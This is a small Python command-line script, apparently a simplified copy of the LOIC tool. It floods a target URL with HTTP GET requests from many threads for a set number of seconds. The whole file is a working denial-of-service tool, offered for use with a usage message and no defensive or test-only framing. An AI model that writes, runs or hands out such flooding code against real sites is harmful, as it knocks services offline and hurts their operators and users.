# loic-simple.py
import requests
import threading
import time
import sys

def flood(url, threads=10, duration=10):
    end_time = time.time() + duration
    
    def attack():
        while time.time() < end_time:
            try:
                requests.get(url)
            except:
                pass
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python loic-simple.py <url> [threads] [duration]")
        sys.exit(1)
    
    url = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    
    print(f"Flooding {url} with {threads} threads for {duration}s")
    flood(url, threads, duration)
    print("Done")
